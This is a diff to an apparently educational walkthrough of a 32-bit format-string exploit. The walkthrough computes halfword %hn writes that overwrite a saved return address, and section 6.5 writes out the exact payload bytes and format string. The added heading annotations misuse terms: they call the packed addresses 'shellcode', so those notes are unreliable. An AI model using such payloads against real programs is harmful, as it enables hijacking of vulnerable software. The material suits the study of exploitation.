@@ -57,13 +57,13 @@ From the source behavior, saved RET is at:
 Example:
 - `ret_addr = 0xffffdc3c + 0x30 = 0xffffdc6c`
 
-### 3. Split target into two halfwords
+### 3. Split target into two halfwords - stuff in the percentages
 
 Target is `0x080491a6`:
 - `high = 0x0804 = 2052`
 - `low  = 0x91a6 = 37286`
 
-### 4. Choose write destinations
+### 4. Choose write destinations - stuff you put in the shellcode
 
 Use two `%hn` writes:
 - write `high` to `ret_addr + 2`
@@ -73,7 +73,7 @@ So:
 - `addr1 = ret_addr + 2 = 0xffffdc6e`
 - `addr2 = ret_addr     = 0xffffdc6c`
 
-### 5. Compute paddings
+### 5. Compute paddings - since you are printing out 8 bytes of shellcode pad for 8 so its in order
 
 First 8 bytes printed are the two packed addresses.
 
@@ -96,7 +96,7 @@ Total: `8 + 23 = 31`
 
 ### 6.5 Exact terminal input for this hand example
 
-Using the exact worked values above:
+Using the exact worked values above: - shell code is always backwards swapped 
 - `addr1 = 0xffffdc6e` -> `\x6e\xdc\xff\xff`
 - `addr2 = 0xffffdc6c` -> `\x6c\xdc\xff\xff`
 - format = `%2044c%1$hn%35234c%2$hn`
